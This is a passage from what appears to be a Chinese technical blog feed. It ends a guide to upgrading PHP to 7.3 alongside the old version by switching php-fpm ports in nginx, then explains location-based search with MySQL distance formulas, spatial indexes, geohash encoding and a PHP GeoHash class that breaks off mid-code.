--with-zlib --enable-zip --with-bz2 --with-readline --with-gd --enable-gd-native-ttf --enable-gd-jis-conv</span><br></pre></td></tr></table></figure><p>更改其中安装目录防止与现有版本冲突</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/</span><br></pre></td></tr></table></figure><p>现在改成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--prefix=/usr/local/php7.3/ --with-config-file-path=/usr/local/php7.3/etc/</span><br></pre></td></tr></table></figure><p>然后就生成 Makefile 文件， <code>make &amp;&amp; make install</code> 这里没什么好说的。  </p><h3 id="二、复制配置文件"><a href="#二、复制配置文件" class="headerlink" title="二、复制配置文件"></a>二、复制配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mv PHP7.3安装目录/etc/php-fpm.conf.default        PHP7.3安装目录/etc/php-fpm.conf</span><br><span class="line"></span><br><span class="line">mv PHP7.3源码目录/php.ini-development             PHP7.3安装目录/etc/php.ini</span><br><span class="line"></span><br><span class="line">mv PHP7.3安装目录/etc/php-fpm.d/www.conf.default  PHP7.3安装目录/etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure><h3 id="三、修改新的配置文件"><a href="#三、修改新的配置文件" class="headerlink" title="三、修改新的配置文件"></a>三、修改新的配置文件</h3><ol><li><p>php.ini 里面的扩展库路径，否则将会抛出警告，扩展不可用</p></li><li><p>php-fpm.conf 里面的 include=/usr/local/php7.3/etc/php-fpm.d/*.conf  </p></li><li><p><a href="http://www.conf" target="_blank" rel="noopener">www.conf</a> 里面的 listen  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;listen = 127.0.0.1:9000 ;原</span><br><span class="line"></span><br><span class="line">listen = 127.0.0.1:9001 ;新</span><br></pre></td></tr></table></figure></li></ol><p>新旧版本各监听不同端口。  </p><h3 id="四、启动新的-php-fpm"><a href="#四、启动新的-php-fpm" class="headerlink" title="四、启动新的 php-fpm"></a>四、启动新的 php-fpm</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/php7.3/sbin/php-fpm</span><br></pre></td></tr></table></figure><p>此时两个版本将共同存在   </p><h3 id="五、测试新的-php-fpm"><a href="#五、测试新的-php-fpm" class="headerlink" title="五、测试新的 php-fpm"></a>五、测试新的 php-fpm</h3><p>打开你的 nginx 配置文件，找到  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> location ~ \.php$ &#123;</span><br><span class="line">fastcgi_pass   127.0.0.1:9001; # 改成新的端口</span><br><span class="line">fastcgi_index  index.php; </span><br><span class="line">fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改成新的监听地址, 重新载入 nginx 配置文件  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><p>测试网站没有问题就关掉旧版本的 php-fpm，有问题就修改 nginx 配置文件，使用旧的 php-fpm。</p><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>大家可能也看出来了，这种升级方式事实上就是主机上安装多版本PHP，然后进行php-fpm的切换而已。这种方式不仅适用于PHP，其他如mysql,redis等均可适用。但是需要注意各个版本之间的代码差别，防止因版本改变而产生语法错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网上能搜到的中文内容，根本不算无缝升级，既然敢叫无缝升级，那就是真的不关机，不中断服务，并且还能保证出问题能100%退回原来的版本。  &lt;/p&gt;
&lt;h3 id=&quot;一、获取原来的编译参数&quot;&gt;&lt;a href=&quot;#一、获取原来的编译参数&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
      <category term="PHP" scheme="http://ya2.top/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>两种简单方案实现LBS</title>
    <link href="http://ya2.top/articles/%E4%B8%A4%E7%A7%8D%E7%AE%80%E5%8D%95%E6%96%B9%E6%A1%88%E5%AE%9E%E7%8E%B0LBS/"/>
    <id>http://ya2.top/articles/两种简单方案实现LBS/</id>
    <published>2020-07-27T10:15:23.000Z</published>
    <updated>2021-06-16T02:23:30.002Z</updated>
    
    <content type="html"><![CDATA[<h3 id="方案一：-Mysql"><a href="#方案一：-Mysql" class="headerlink" title="方案一： Mysql"></a>方案一： Mysql</h3><h4 id="通过球面两点距离公式"><a href="#通过球面两点距离公式" class="headerlink" title="通过球面两点距离公式"></a>通过球面两点距离公式</h4><blockquote><p>$ AB = R * \arccos{( \cos{wA} * \cos{wB} * \cos{jB-jA} + \sin{wA}*\sin{wB})}$<br>其中 A（jA,wA）和B（jB，wB）,推导过程见<a href="http://www.360doc.com/content/14/0117/10/325430_345890919.shtml" target="_blank" rel="noopener">这里</a></p></blockquote><p>对于大部分已经使用MySQL的应用来说，使用这种方案没有任何迁移和部署成本，但使用SQL语句进行查询的缺点也显而易见，每条SQL的计算量都会非常大，性能将会是严重的问题。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> address (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">INT</span> (<span class="number">11</span>) AUTO_INCREMENT,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">CHAR</span> (<span class="number">80</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">lat <span class="built_in">CHAR</span> (<span class="number">10</span>),</span><br><span class="line">lng <span class="built_in">CHAR</span> (<span class="number">10</span>),</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> address(<span class="keyword">name</span>,point,lat,lng) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="string">'成都'</span>, <span class="number">30.659673</span>,<span class="number">104.068433</span>)</span><br><span class="line">,(<span class="string">'绵阳'</span>, <span class="number">31.473909</span>,<span class="number">104.680961</span>)</span><br><span class="line">,(<span class="string">'泸州'</span>, <span class="number">28.876403</span>,<span class="number">105.450251</span>) </span><br><span class="line">,(<span class="string">'德阳'</span>, <span class="number">31.134847</span>,<span class="number">104.408441</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    <span class="keyword">id</span>,<span class="keyword">name</span>, (</span><br><span class="line">      <span class="number">6371</span> * <span class="keyword">acos</span> (    <span class="comment"># 3959是地球半径的英里，6371是地球半径的千米</span></span><br><span class="line">      <span class="keyword">cos</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">      * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">      * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lng ) - <span class="keyword">radians</span>(<span class="number">106.644153</span>) )</span><br><span class="line">      + <span class="keyword">sin</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">      * <span class="keyword">sin</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">    )</span><br><span class="line">) <span class="keyword">AS</span> distance</span><br><span class="line"><span class="keyword">FROM</span> address</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> distance</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">0</span> , <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询结果</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 3泸州209.7647687926011</span></span><br><span class="line"><span class="comment"> 2绵阳218.97099731812352</span></span><br><span class="line"><span class="comment"> 4德阳226.64161541779157</span></span><br><span class="line"><span class="comment"> 1成都247.70751793832144</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="通过空间存储-spatial"><a href="#通过空间存储-spatial" class="headerlink" title="通过空间存储(spatial)"></a>通过空间存储(spatial)</h4><p>MySQL的空间扩展（MySQL Spatial Extensions），它允许在MySQL中直接处理、保存和分析地理位置相关的信息，但是需要手动排序（请忽略distance字段）。文档可见<a href="https://dev.mysql.com/doc/refman/8.0/en/spatial-types.html" target="_blank" rel="noopener">这里</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> address (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">INT</span> (<span class="number">11</span>) AUTO_INCREMENT,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">CHAR</span> (<span class="number">80</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">point POINT <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="keyword">id</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment"># 创建索引</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> address <span class="keyword">ADD</span> SPATIAL <span class="keyword">INDEX</span>(point);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入测试数据</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> address(<span class="keyword">name</span>,point,lat,lng) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="string">'成都'</span>, GeomFromText(<span class="string">'POINT(30.659673 104.068433)'</span>))</span><br><span class="line">,(<span class="string">'绵阳'</span>, GeomFromText(<span class="string">'POINT(31.473909 104.680961)'</span>))</span><br><span class="line">,(<span class="string">'泸州'</span>, GeomFromText(<span class="string">'POINT(28.876403 105.450251)'</span>)) </span><br><span class="line">,(<span class="string">'德阳'</span>, GeomFromText(<span class="string">'POINT(31.134847 104.408441)'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询： 查找坐标(30.452034,106.644153)附近 220 公里内的城市</span></span><br><span class="line"><span class="keyword">SELECT</span>  <span class="keyword">id</span>,<span class="keyword">name</span>,(</span><br><span class="line">          <span class="number">6371</span> * <span class="keyword">acos</span> (    <span class="comment"># 3959是地球半径的英里，6371是地球半径的千米</span></span><br><span class="line">          <span class="keyword">cos</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">          * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">          * <span class="keyword">cos</span>( <span class="keyword">radians</span>( lng ) - <span class="keyword">radians</span>(<span class="number">106.644153</span>) )</span><br><span class="line">          + <span class="keyword">sin</span> ( <span class="keyword">radians</span>(<span class="number">30.452034</span>) )</span><br><span class="line">          * <span class="keyword">sin</span>( <span class="keyword">radians</span>( lat ) )</span><br><span class="line">        )</span><br><span class="line">    ) <span class="keyword">AS</span> distance <span class="comment"># 仅供结果可视，非必须</span></span><br><span class="line">    <span class="keyword">FROM</span>    address</span><br><span class="line">    <span class="keyword">WHERE</span>   MBRContains (</span><br><span class="line">                LineString(</span><br><span class="line">                        Point (</span><br><span class="line">                                <span class="number">30.452034</span> + <span class="number">220</span> / ( <span class="number">111.1</span> / <span class="keyword">COS</span>(<span class="keyword">RADIANS</span>(<span class="number">30.452034</span>))), // <span class="number">1</span>弧度 = <span class="number">111.1</span></span><br><span class="line">                                <span class="number">106.644153</span> + <span class="number">220</span> / <span class="number">111.1</span></span><br><span class="line">                          ),</span><br><span class="line">                        Point (</span><br><span class="line">                                <span class="number">30.452034</span> - <span class="number">220</span> / ( <span class="number">111.1</span> / <span class="keyword">COS</span>(<span class="keyword">RADIANS</span>(<span class="number">30.452034</span>))),</span><br><span class="line">                                <span class="number">106.644153</span> - <span class="number">220</span> / <span class="number">111.1</span></span><br><span class="line">                        ) </span><br><span class="line">                ), point)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查询结果</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 2绵阳218.97099731812352</span></span><br><span class="line"><span class="comment"> 3泸州209.7647687926011</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h4 id="通过Geohash算法"><a href="#通过Geohash算法" class="headerlink" title="通过Geohash算法"></a>通过Geohash算法</h4><p>GeoHash是一种地址编码，通过切分地图区域为小方块（切分次数越多，精度越高），它能把二维的经纬度编码成一维的字符串。也就是说，理论上geohash字符串表示的并不是一个点，而是一个矩形区域，只要矩形区域足够小，达到所需精度即可。（MongoDB的索引也是基于geohash）</p><p>如：wm3yr31d252414ux就是目前我所在的位置，降低一些精度，就会是wm3yr31d2524，再降低一些精度，就会是wm3yr。</p><p>所以这样一来，我们就可以在MySQL中用LIKE ‘wm3yr%’来限定区域范围查询目标点，并且可以对结果集做缓存。更不会因为微小的经纬度变化而无法用上数据库的Query Cache。</p><p>这种方案的优点显而易见，仅用一个字符串保存经纬度信息，并且精度由字符串从头到尾的长度决定，可以方便索引。</p><p>但这种方案的缺点是：从geohash的编码算法中可以看出，靠近每个方块边界两侧的点虽然十分接近，但所属的编码会完全不同。实际应用中，虽然可以通过去搜索环绕当前方块周围的8个方块来解决该问题，但一下子将原来只需要1次SQL查询变成了需要查询9次，这样不仅增大了查询量，也将原本简单的方案复杂化了。除此之外，这个方案也无法直接得到距离，需要程序协助进行后续的排序计算。</p><p><strong>geohash的编码算法</strong></p><p>成都永丰立交经纬度(30.63578,104.031601)</p><p>1)、纬度范围(-90, 90)平分成两个区间(-90, 0)、(0, 90)， 如果目标纬度位于前一个区间，则编码为0，否则编码为1。</p><p>由于30.625265属于(0, 90)，所以取编码为1。</p><p>然后再将(0, 90)分成 (0, 45), (45, 90)两个区间，而39.92324位于(0, 45)，所以编码为0</p><p>然后再将(0, 45)分成 (0, 22.5), (22.5, 45)两个区间，而39.92324位于(22.5, 45)，所以编码为1</p><p>依次类推可得永丰立交纬度编码为101010111001001000100101101010。</p><p>2)、经度也用同样的算法，对(-180, 180)依次细分，(-180，0)、(0,180) 得出编码110010011111101001100000000000</p><p>3)、合并经纬度编码，从高到低，先取一位经度，再取一位纬度；得出结果 111001001100011111101011100011000010110000010001010001000100</p><p>4)、用0-9、b-z（去掉a, i, l, o）这32个字母进行base32编码，得到(30.63578,104.031601)的编码为wm3yr31d2524。</p><p>11100 10011 00011 11110 10111 00011 00001 01100 00010 00101 00010 00100 =&gt; <a href="http://geohash.org/wm3yr31d2524" target="_blank" rel="noopener">wm3yr31d2524</a></p><p>算法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GeoHash</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Base32编码映射关系</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> DIGITS = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'9'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'p'</span>,</span><br><span class="line">        <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 精确度，值越大越精准, 建议此处使用5的倍数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> MAX = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * GeoHash encode</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $lat</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $lng</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($lat, $lng)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::base32_encode(<span class="keyword">self</span>::combine(<span class="keyword">self</span>::dec2bit($lat, <span class="number">-90</span>, <span class="number">90</span>), <span class="keyword">self</span>::dec2bit($lng, <span class="number">-180</span>, <span class="number">180</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * GeoHash decode</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $val</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $encode = <span class="keyword">self</span>::base32_decode($val);</span><br><span class="line">        <span class="keyword">list</span>($elat, $elng) = <span class="keyword">self</span>::spilt($encode);</span><br><span class="line">        <span class="keyword">return</span> [<span class="keyword">self</span>::bit2dec($elat, <span class="number">-90</span>, <span class="number">90</span>), <span class="keyword">self</span>::bit2dec($elng, <span class="number">-180</span>, <span class="number">180</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将十进制转换成二进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $v 十进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $l 左阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $r 右阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">dec2bit</span><span class="params">($v, $l, $r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s = <span class="string">''</span>;</span><br><span class="line">        $max = <span class="keyword">self</span>::MAX;</span><br><span class="line">        <span class="keyword">while</span> ($max--) &#123;</span><br><span class="line">            $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">            $d = $mid &gt; $v ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($d) &#123;</span><br><span class="line">                $l = $mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $r = $mid;</span><br><span class="line">            &#125;</span><br><span class="line">            $s .= $d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 经纬度编码值合并</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $elat 二进制维度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $elng 二进制经度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">combine</span><span class="params">($elat, $elng)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $c = <span class="string">''</span>;</span><br><span class="line">        $max = <span class="keyword">self</span>::MAX;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $max; $i++) &#123;</span><br><span class="line">            $c .= $elng[$i] . $elat[$i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base32编码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s 合并后的经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base32_encode</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $r = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i += <span class="number">5</span>) &#123;</span><br><span class="line">            $sub = str_pad(substr($s, $i, <span class="number">5</span>), <span class="number">5</span>, <span class="number">0</span>, STR_PAD_RIGHT);</span><br><span class="line">            $num = base_convert($sub,<span class="number">2</span>,<span class="number">10</span>);</span><br><span class="line">            $r .= <span class="keyword">self</span>::DIGITS[$num];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base32解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s GeoHash.encode的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base32_decode</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $r = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i++) &#123;</span><br><span class="line">            $v = array_search($s[$i], <span class="keyword">self</span>::DIGITS);</span><br><span class="line">            $b = str_pad(base_convert($v, <span class="number">10</span>, <span class="number">2</span>), <span class="number">5</span>, <span class="number">0</span>, STR_PAD_LEFT);</span><br><span class="line">            $r .= $b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 经纬度拆分</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s 将合并的经纬度拆出来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">spilt</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lat = <span class="string">''</span>;</span><br><span class="line">        $lng = <span 